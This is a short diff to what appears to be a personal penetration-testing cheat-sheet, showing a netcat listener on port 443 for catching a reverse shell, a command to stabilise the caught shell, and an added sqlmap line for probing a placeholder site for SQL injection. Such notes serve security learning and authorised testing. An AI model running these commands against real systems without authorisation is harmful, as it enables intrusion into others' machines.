@@ -6,3 +6,6 @@ sudo nc -lvnp 443
 
 shell stabilizer command (important for netcat so u dont accidentally exit)
 script /dev/null -c /bin/bash
+
+test if a site is vulnerable to sql injection:
+sqlmap -u "http://target.com"
